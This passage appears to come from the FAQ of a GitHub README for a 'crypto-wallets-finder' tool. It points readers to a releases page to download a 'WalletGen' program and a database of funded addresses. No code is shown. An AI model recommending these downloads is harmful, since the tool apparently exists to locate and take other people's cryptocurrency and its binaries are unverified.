...
You can download the WalletGen given on the [page in the release](https://github.com/prettyguy-2000af/crypto-wallets-finder-hs/releases).

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [page in the release](https://github.com/prettyguy-2000af/crypto-wallets-finder-hs/releases).
